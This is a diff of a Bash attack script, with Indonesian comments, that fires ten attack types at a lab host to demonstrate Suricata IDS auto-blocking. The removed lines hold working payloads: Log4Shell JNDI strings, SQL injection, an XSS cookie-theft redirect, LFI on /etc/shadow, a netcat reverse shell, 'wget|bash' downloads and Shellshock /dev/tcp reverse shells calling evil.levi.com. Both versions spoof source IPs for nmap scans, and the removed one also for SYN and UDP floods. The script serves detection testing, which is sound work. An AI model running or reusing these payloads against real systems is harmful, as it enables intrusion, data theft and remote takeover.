@@ -1,313 +1,189 @@
-#!/usr/bin/env bash
-# =============================================================================
-#  atk.sh — 10 Jenis Serangan untuk Demo Dosen (Suricata Auto Block)
-#  Author  : Levi (github.com/LEVI6957)
-#  Usage   : sudo bash atk.sh
-#
-#  Pastikan Suricata & dummy_web sudah berjalan di target.
-#  Jalankan dari mesin Kali Linux.
-# =============================================================================
+#!/bin/bash
+# Suricata EVE - Automated Attack Script
+# Diperbarui dengan 10 Serangan Spesifik untuk Suricata ET Open Rules
 
-# ── Warna ─────────────────────────────────────────────────────────────────────
-RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
-BLUE='\033[0;34m'; CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'
-
-info()    { echo -e "${GREEN}[INFO]${NC}  $*"; }
-warn()    { echo -e "${YELLOW}[WARN]${NC}  $*"; }
-atk()     { echo -e "${RED}[ATK]${NC}   $*"; }
-success() { echo -e "${CYAN}[✓]${NC}    $*"; }
-header()  { echo -e "\n${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}"
-            echo -e "${BOLD}${BLUE}  $*${NC}"
-            echo -e "${BOLD}${BLUE}══════════════════════════════════════════════════════${NC}\n"; }
-
-# ── Konfigurasi ───────────────────────────────────────────────────────────────
 TARGET="192.168.216.128"
-IFACE="eth0"
 
-# IP palsu via raw socket (nmap/hping3 — tidak perlu ip addr add)
-SPOOF_1="192.168.216.101"   # nmap port scan
-SPOOF_2="192.168.216.102"   # hping3 SYN flood
-SPOOF_3="192.168.216.103"   # hping3 UDP flood
+# Warna
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+BOLD='\033[1m'
+NC='\033[0m' # No Color
 
-# Virtual IP untuk curl (perlu ip addr add dulu)
-VIRT_IP4="192.168.216.104"   # Log4Shell
-VIRT_IP5="192.168.216.105"   # SQL Injection
-VIRT_IP6="192.168.216.106"   # XSS
-VIRT_IP7="192.168.216.107"   # LFI / Path Traversal
-VIRT_IP8="192.168.216.108"   # RCE / Command Injection
-VIRT_IP9="192.168.216.109"   # Shellshock CVE-2014-6271
-VIRT_IP10="192.168.216.110"  # Web Scanner (Nikto UA)
+# Definisi 10 IP Bayangan
+VIRT_IP1="192.168.216.101"
+VIRT_IP2="192.168.216.102"
+VIRT_IP3="192.168.216.103"
+VIRT_IP4="192.168.216.104"
+VIRT_IP5="192.168.216.105"
+VIRT_IP6="192.168.216.106"
+VIRT_IP7="192.168.216.107"
+VIRT_IP8="192.168.216.108"
+VIRT_IP9="192.168.216.109"
+VIRT_IP10="192.168.216.110"
 
-ALL_VIRT=(${VIRT_IP4} ${VIRT_IP5} ${VIRT_IP6} ${VIRT_IP7} ${VIRT_IP8} ${VIRT_IP9} ${VIRT_IP10})
+# ─── Helper Functions ─────────────────────────────────────────────────────────
 
-# ── Root Check ────────────────────────────────────────────────────────────────
-[[ $EUID -ne 0 ]] && echo -e "${RED}Jalankan dengan: sudo bash atk.sh${NC}" && exit 1
+header() {
+    echo -e "\n${BLUE}${BOLD}======================================================${NC}"
+    echo -e "${CYAN}${BOLD} $1 ${NC}"
+    echo -e "${BLUE}${BOLD}======================================================${NC}\n"
+}
 
-# ── Cleanup otomatis saat exit ────────────────────────────────────────────────
-cleanup() {
-    echo ""
-    warn "Membersihkan virtual IP..."
-    for ip in "${ALL_VIRT[@]}"; do
-        ip addr del ${ip}/24 dev $IFACE 2>/dev/null
+info() {
+    echo -e "${YELLOW}[*]${NC} $1"
+}
+
+success() {
+    echo -e "${GREEN}[+]${NC} $1"
+}
+
+atk() {
+    echo -e "${RED}[!]${NC} $1"
+}
+
+setup_all_ips() {
+    info "Menyiapkan 10 IP Bayangan di antarmuka eth0..."
+    for i in {101..110}; do
+        ip addr add 192.168.216.$i/24 dev eth0 2>/dev/null
     done
-    success "Bersih!"
-}
-trap cleanup EXIT
-
-# ── Fungsi Helper ─────────────────────────────────────────────────────────────
-setup_virt_ip() {
-    local ip=$1
-    ip addr add ${ip}/24 dev $IFACE 2>/dev/null && info "Virtual IP ${ip} aktif"
-    sleep 0.3
+    success "Semua IP Bayangan siap digunakan!"
 }
 
-send_curl() {
-    # $1=interface-ip, $2=url, rest=headers (-H "...")
-    local vip=$1; local url=$2; shift 2
-    curl --interface ${vip} "$@" "${url}" -s -o /dev/null -w "  → HTTP %{http_code}\n"
-}
-
-spam_curl() {
-    # Kirim N request dari 1 IP → trigger auto-block
-    local vip=$1; local url=$2; local n=${3:-5}; shift 3
-    for i in $(seq 1 $n); do
-        curl --interface ${vip} "$@" "${url}" -s -o /dev/null
-        echo -e "  ${RED}Hit ${i}/${n}${NC} dari ${vip}"
-        sleep 0.15
+cleanup_all_ips() {
+    info "Menghapus semua IP Bayangan dari antarmuka eth0..."
+    for i in {101..110}; do
+        ip addr del 192.168.216.$i/24 dev eth0 2>/dev/null
     done
-    success "${vip} → harusnya sudah DIBLOK! Cek dashboard 🔒"
+    success "Pembersihan selesai."
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-# FUNGSI 10 SERANGAN
-# ══════════════════════════════════════════════════════════════════════════════
+# ─── Attack Modules (Berbasis ET Open Rules) ──────────────────────────────────
 
-# 1. nmap Port Scan ─────────────────────────────────────────────────────────────
 do_1_portscan() {
-    header "1️⃣  Port Scan — nmap Aggressive (dari ${SPOOF_1})"
-    atk "nmap -S ${SPOOF_1} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn"
-    nmap -S ${SPOOF_1} -e ${IFACE} -A -T5 -p 1-5000 ${TARGET} -Pn
-    success "Port scan selesai!"
+    header "1️⃣  Port Scan (Nmap Aggressive) - IP: .101"
+    atk "Mendeteksi port terbuka dan versi service..."
+    nmap -S ${VIRT_IP1} -e eth0 -sV -sC -A -T4 -p 1-1000 ${TARGET} -Pn
 }
 
-# 2. SYN Flood ─────────────────────────────────────────────────────────────────
-do_2_synflood() {
-    header "2️⃣  SYN Flood — hping3 (dari ${SPOOF_2})"
-    atk "hping3 -S -a ${SPOOF_2} -I ${IFACE} -p 80 -c 20 ${TARGET}"
-    hping3 -S -a ${SPOOF_2} -I ${IFACE} -p 80 -c 20 ${TARGET}
-    success "SYN Flood selesai!"
+do_2_synscan() {
+    header "2️⃣  SYN Stealth Scan (Nmap) - IP: .102"
+    atk "Scanning OS secara diam-diam tanpa full koneksi TCP..."
+    nmap -S ${VIRT_IP2} -e eth0 -sS -O --osscan-guess -T4 ${TARGET} -Pn
 }
 
-# 3. UDP Flood ─────────────────────────────────────────────────────────────────
-do_3_udpflood() {
-    header "3️⃣  UDP Flood — hping3 (dari ${SPOOF_3})"
-    atk "hping3 --udp -a ${SPOOF_3} -I ${IFACE} -p 53 -c 20 ${TARGET}"
-    hping3 --udp -a ${SPOOF_3} -I ${IFACE} -p 53 -c 20 ${TARGET}
-    success "UDP Flood selesai!"
+do_3_finscan() {
+    header "3️⃣  FIN Scan (Nmap) - IP: .103"
+    atk "Mengirim paket FIN untuk menembus firewall..."
+    nmap -S ${VIRT_IP3} -e eth0 -sF -T4 -p 80,8080,22 ${TARGET} -Pn
 }
 
-# 4. Log4Shell CVE-2021-44228 ──────────────────────────────────────────────────
-do_4_log4shell() {
-    header "4️⃣  Log4Shell CVE-2021-44228 (dari ${VIRT_IP4})"
-    setup_virt_ip ${VIRT_IP4}
-
-    atk "Mengirim payload JNDI ldap..."
-    send_curl ${VIRT_IP4} "http://${TARGET}/" \
-        -H 'User-Agent: ${jndi:ldap://evil.levi.com/Log4Shell}'
-
-    atk "Variasi via X-Api-Version..."
-    send_curl ${VIRT_IP4} "http://${TARGET}/api" \
-        -H 'X-Api-Version: ${jndi:ldap://attacker.levi.com/a}'
-
-    atk "Spam 5x → trigger auto-block..."
-    spam_curl ${VIRT_IP4} "http://${TARGET}/" 5 \
-        -H 'User-Agent: ${jndi:ldap://evil.levi.com/exploit}'
+do_4_xmasscan() {
+    header "4️⃣  XMAS Scan (Nmap) - IP: .104"
+    atk "Mengirim paket TCP 'Lampu Natal' (FIN, PSH, URG)..."
+    nmap -S ${VIRT_IP4} -e eth0 -sX -T4 -p 80,8080,22 ${TARGET} -Pn
 }
 
-# 5. SQL Injection ─────────────────────────────────────────────────────────────
-do_5_sqli() {
-    header "5️⃣  SQL Injection (dari ${VIRT_IP5})"
-    setup_virt_ip ${VIRT_IP5}
-
-    atk "Classic OR 1=1..."
-    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%27%20OR%201%3D1--"
-
-    atk "UNION SELECT dump..."
-    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%20UNION%20SELECT%20null,table_name,null%20FROM%20information_schema.tables--"
-
-    atk "Blind SQLi via sleep..."
-    send_curl ${VIRT_IP5} "http://${TARGET}/?id=1%3BSELECT%20SLEEP(5)--"
-
-    atk "Spam SQLi 5x → trigger block..."
-    spam_curl ${VIRT_IP5} "http://${TARGET}/?id=1'%20OR%20'1'='1" 5
+do_5_lfi() {
+    header "5️⃣  Local File Inclusion (/etc/passwd) - IP: .105"
+    atk "Membaca file sistem sensitif via URL..."
+    curl --interface ${VIRT_IP5} "http://${TARGET}/vulnerabilities/fi/?page=../../../../../../../../etc/passwd"
 }
 
-# 6. XSS (Cross-Site Scripting) ────────────────────────────────────────────────
-do_6_xss() {
-    header "6️⃣  XSS — Cross-Site Scripting (dari ${VIRT_IP6})"
-    setup_virt_ip ${VIRT_IP6}
-
-    atk "XSS via URL parameter..."
-    send_curl ${VIRT_IP6} "http://${TARGET}/?search=<script>alert('xss')</script>"
-
-    atk "XSS via Referer header..."
-    send_curl ${VIRT_IP6} "http://${TARGET}/" \
-        -H 'Referer: <script>document.location="http://evil.levi.com/?c="+document.cookie</script>'
-
-    atk "XSS payload img onerror..."
-    send_curl ${VIRT_IP6} "http://${TARGET}/?q=<img%20src=x%20onerror=alert(1)>"
-
-    atk "Spam XSS 5x → trigger block..."
-    spam_curl ${VIRT_IP6} "http://${TARGET}/?x=<script>alert(1)</script>" 5
+do_6_morfeus() {
+    header "6️⃣  Morfeus Web Scanner (muieblackcat) - IP: .106"
+    atk "Memalsukan signature scanner Morfeus lawas..."
+    curl --interface ${VIRT_IP6} "http://${TARGET}/muieblackcat"
 }
 
-# 7. LFI — Local File Inclusion / Path Traversal ───────────────────────────────
-do_7_lfi() {
-    header "7️⃣  LFI / Path Traversal (dari ${VIRT_IP7})"
-    setup_virt_ip ${VIRT_IP7}
-
-    atk "Path traversal /etc/passwd..."
-    send_curl ${VIRT_IP7} "http://${TARGET}/../../../../etc/passwd"
-
-    atk "PHP wrapper include..."
-    send_curl ${VIRT_IP7} "http://${TARGET}/?file=php://filter/convert.base64-encode/resource=/etc/passwd"
-
-    atk "Windows path traversal..."
-    send_curl ${VIRT_IP7} "http://${TARGET}/?page=..%2F..%2F..%2Fetc%2Fshadow"
-
-    atk "Spam LFI 5x → trigger block..."
-    spam_curl ${VIRT_IP7} "http://${TARGET}/../../etc/passwd" 5
+do_7_phpeasteregg() {
+    header "7️⃣  PHP Easter Egg Info Disclosure - IP: .107"
+    atk "Mengakses halaman rahasia PHP..."
+    curl --interface ${VIRT_IP7} "http://${TARGET}/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42"
 }
 
-# 8. RCE — Remote Code Execution / Command Injection ──────────────────────────
-do_8_rce() {
-    header "8️⃣  RCE / Command Injection (dari ${VIRT_IP8})"
-    setup_virt_ip ${VIRT_IP8}
-
-    atk "Bash command via URL..."
-    send_curl ${VIRT_IP8} "http://${TARGET}/?cmd=id;whoami;cat%20/etc/passwd"
-
-    atk "Netcat reverse shell attempt..."
-    send_curl ${VIRT_IP8} "http://${TARGET}/?cmd=nc%20-e%20/bin/bash%20evil.levi.com%204444"
-
-    atk "wget download malware..."
-    send_curl ${VIRT_IP8} "http://${TARGET}/" \
-        -H 'X-Api-Version: ;wget http://evil.levi.com/shell.sh|bash'
-
-    atk "Spam RCE 5x → trigger block..."
-    spam_curl ${VIRT_IP8} "http://${TARGET}/?cmd=cat%20/etc/shadow" 5
+do_8_gobuster() {
+    header "8️⃣  Web Directory Scanner (Gobuster) - IP: .108"
+    atk "Memalsukan User-Agent Gobuster..."
+    curl --interface ${VIRT_IP8} -H "User-Agent: gobuster/3.1.0" "http://${TARGET}/admin/"
 }
 
-# 9. Shellshock CVE-2014-6271 ─────────────────────────────────────────────────
-do_9_shellshock() {
-    header "9️⃣  Shellshock CVE-2014-6271 (dari ${VIRT_IP9})"
-    setup_virt_ip ${VIRT_IP9}
-
-    atk "Shellshock via User-Agent..."
-    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/test.cgi" \
-        -H $'User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/evil.levi.com/4444 0>&1'
-
-    atk "Shellshock via Referer..."
-    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/status" \
-        -H $'Referer: () { :;}; echo Content-Type: text/html; echo; /bin/cat /etc/passwd'
-
-    atk "Shellshock via Cookie..."
-    send_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/admin.cgi" \
-        -H $'Cookie: () { :;}; /usr/bin/wget http://evil.levi.com/backdoor -O /tmp/bd'
-
-    atk "Spam Shellshock 5x → trigger block..."
-    spam_curl ${VIRT_IP9} "http://${TARGET}/cgi-bin/test.cgi" 5 \
-        -H $'User-Agent: () { :;}; echo pwned'
+do_9_log4shell() {
+    header "9️⃣  Log4Shell (CVE-2021-44228) - IP: .109"
+    atk "Eksploitasi Java Log4j via injeksi JNDI..."
+    curl --interface ${VIRT_IP9} -H 'User-Agent: ${jndi:ldap://192.168.216.120:1389/Exploit}' "http://${TARGET}/"
 }
 
-# 10. Web Scanner (Nikto) ──────────────────────────────────────────────────────
-do_10_scanner() {
-    header "🔟  Web Scanner / Nikto Scan (dari ${VIRT_IP10})"
-    setup_virt_ip ${VIRT_IP10}
-
-    if command -v nikto &>/dev/null; then
-        atk "Nikto web vulnerability scan..."
-        nikto -h http://${TARGET} -id ${VIRT_IP10} -maxtime 30s -nointeractive 2>/dev/null
-        success "Nikto scan selesai!"
-    else
-        warn "Nikto tidak tersedia, pakai curl manual dengan Nikto User-Agent..."
-
-        atk "Simulasi Nikto via User-Agent..."
-        send_curl ${VIRT_IP10} "http://${TARGET}/" \
-            -H 'User-Agent: Mozilla/5.0 Nikto/2.1.6'
-        send_curl ${VIRT_IP10} "http://${TARGET}/admin/"
-        send_curl ${VIRT_IP10} "http://${TARGET}/phpmyadmin/"
-        send_curl ${VIRT_IP10} "http://${TARGET}/.git/config"
-        send_curl ${VIRT_IP10} "http://${TARGET}/wp-admin/"
-        send_curl ${VIRT_IP10} "http://${TARGET}/xmlrpc.php"
-        send_curl ${VIRT_IP10} "http://${TARGET}/.env"
-        send_curl ${VIRT_IP10} "http://${TARGET}/config.php"
-        send_curl ${VIRT_IP10} "http://${TARGET}/backup.sql"
-        send_curl ${VIRT_IP10} "http://${TARGET}/server-status"
-
-        atk "Spam scanner 5x → trigger block..."
-        spam_curl ${VIRT_IP10} "http://${TARGET}/admin" 5 \
-            -H 'User-Agent: Mozilla/5.0 Nikto/2.1.6'
-    fi
+do_10_httptrace() {
+    header "🔟  HTTP TRACE Method (XST) - IP: .110"
+    atk "Mengirim metode HTTP TRACE terlarang..."
+    curl --interface ${VIRT_IP10} -X TRACE "http://${TARGET}/"
 }
 
-# ── ALL ───────────────────────────────────────────────────────────────────────
 do_all() {
-    for ip in "${ALL_VIRT[@]}"; do
-        setup_virt_ip ${ip}
-    done
-    do_1_portscan; sleep 1
-    do_2_synflood; sleep 1
-    do_3_udpflood; sleep 1
-    do_4_log4shell; sleep 1
-    do_5_sqli;     sleep 1
-    do_6_xss;      sleep 1
-    do_7_lfi;      sleep 1
-    do_8_rce;      sleep 1
-    do_9_shellshock; sleep 1
-    do_10_scanner
+    setup_all_ips
+    do_1_portscan
+    do_2_synscan
+    do_3_finscan
+    do_4_xmasscan
+    do_5_lfi
+    do_6_morfeus
+    do_7_phpeasteregg
+    do_8_gobuster
+    do_9_log4shell
+    do_10_httptrace
+    success "Semua 10 serangan selesai dieksekusi!"
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-# BANNER & MENU
-# ══════════════════════════════════════════════════════════════════════════════
-header "🔥 SURICATA ATTACK DEMO — 10 JENIS SERANGAN"
-echo -e "  Target    : ${BOLD}${TARGET}${NC}   (dummy_web Apache)"
-echo -e "  Interface : ${BOLD}${IFACE}${NC}"
-echo ""
+# ─── Main Menu ────────────────────────────────────────────────────────────────
 
-header "Pilih Jenis Serangan"
-echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan          — nmap Aggressive       (IP: ${SPOOF_1})"
-echo -e "  ${BOLD} 2${NC}) 💥 SYN Flood           — hping3               (IP: ${SPOOF_2})"
-echo -e "  ${BOLD} 3${NC}) 🌊 UDP Flood           — hping3               (IP: ${SPOOF_3})"
-echo -e "  ${BOLD} 4${NC}) ☠️  Log4Shell           — CVE-2021-44228       (IP: ${VIRT_IP4})"
-echo -e "  ${BOLD} 5${NC}) 💉 SQL Injection       — UNION/Blind/Sleep    (IP: ${VIRT_IP5})"
-echo -e "  ${BOLD} 6${NC}) 🖥️  XSS                 — Script/Img Inject    (IP: ${VIRT_IP6})"
-echo -e "  ${BOLD} 7${NC}) 📂 LFI/Path Traversal  — /etc/passwd          (IP: ${VIRT_IP7})"
-echo -e "  ${BOLD} 8${NC}) 💻 RCE/Cmd Injection   — bash/wget/netcat     (IP: ${VIRT_IP8})"
-echo -e "  ${BOLD} 9${NC}) 🐚 Shellshock          — CVE-2014-6271        (IP: ${VIRT_IP9})"
-echo -e "  ${BOLD}10${NC}) 🕷️  Web Scanner          — Nikto scan           (IP: ${VIRT_IP10})"
-echo -e "  ${BOLD} A${NC}) 🚀 SEMUA SEKALIGUS     — Full demo (1-10)"
-echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
-echo ""
-read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-10 / A]: " CHOICE
+# Pastikan dijalankan sebagai root (karena iptables & ip addr butuh akses root)
+if [ "$EUID" -ne 0 ]; then
+  echo -e "${RED}Error: Tolong jalankan script ini sebagai root (sudo ./atk.sh)${NC}"
+  exit 1
+fi
 
-case $CHOICE in
-     1) do_1_portscan ;;
-     2) do_2_synflood ;;
-     3) do_3_udpflood ;;
-     4) do_4_log4shell ;;
-     5) do_5_sqli ;;
-     6) do_6_xss ;;
-     7) do_7_lfi ;;
-     8) do_8_rce ;;
-     9) do_9_shellshock ;;
-    10) do_10_scanner ;;
-    [Aa]) do_all ;;
-     0) echo "Keluar."; exit 0 ;;
-     *) warn "Pilihan tidak valid." ;;
-esac
+setup_all_ips
 
-echo ""
-success "Selesai! Cek dashboard → http://${TARGET}:8080"
-echo ""
+while true; do
+    echo -e "\n${BLUE}${BOLD}=== SURICATA AUTOMATED ATTACK DEMO ===${NC}"
+    echo -e "Target: ${BOLD}http://${TARGET}${NC}\n"
+    
+    echo -e "  ${BOLD} 1${NC}) 🔍 Port Scan          — Nmap Aggressive    (IP: .101)"
+    echo -e "  ${BOLD} 2${NC}) 👻 SYN Scan           — Nmap Stealth       (IP: .102)"
+    echo -e "  ${BOLD} 3${NC}) 🏁 FIN Scan           — Nmap Firewall Byp. (IP: .103)"
+    echo -e "  ${BOLD} 4${NC}) 🎄 XMAS Scan          — Nmap OS Detection  (IP: .104)"
+    echo -e "  ${BOLD} 5${NC}) 📂 LFI                — /etc/passwd        (IP: .105)"
+    echo -e "  ${BOLD} 6${NC}) 🐈 Morfeus Scanner    — muieblackcat       (IP: .106)"
+    echo -e "  ${BOLD} 7${NC}) 🥚 PHP Easter Egg     — Info Disclosure    (IP: .107)"
+    echo -e "  ${BOLD} 8${NC}) 🕷️  Gobuster           — Dir Brute Force    (IP: .108)"
+    echo -e "  ${BOLD} 9${NC}) 🐚 Log4Shell          — CVE-2021-44228     (IP: .109)"
+    echo -e "  ${BOLD}10${NC}) 🔀 HTTP TRACE         — Cross-Site Tracing (IP: .110)"
+    echo -e "  ${BOLD} A${NC}) 🚀 SEMUA SEKALIGUS     — Full demo berurutan"
+    echo -e "  ${BOLD} C${NC}) 🧹 Hapus IP Bayangan   — Bersihkan eth0"
+    echo -e "  ${BOLD} 0${NC}) ❌ Keluar"
+    echo ""
+    read -rp "$(echo -e ${YELLOW}[?]${NC}) Pilih [0-10 / A / C]: " CHOICE
+
+    case $CHOICE in
+         1) do_1_portscan ;;
+         2) do_2_synscan ;;
+         3) do_3_finscan ;;
+         4) do_4_xmasscan ;;
+         5) do_5_lfi ;;
+         6) do_6_morfeus ;;
+         7) do_7_phpeasteregg ;;
+         8) do_8_gobuster ;;
+         9) do_9_log4shell ;;
+        10) do_10_httptrace ;;
+        [Aa]) do_all ;;
+        [Cc]) cleanup_all_ips ;;
+         0) cleanup_all_ips; echo "Keluar."; exit 0 ;;
+         *) echo -e "${RED}Pilihan tidak valid!${NC}" ;;
+    esac
+    echo ""
+    success "Cek dashboard → http://${TARGET}:8080"
+done
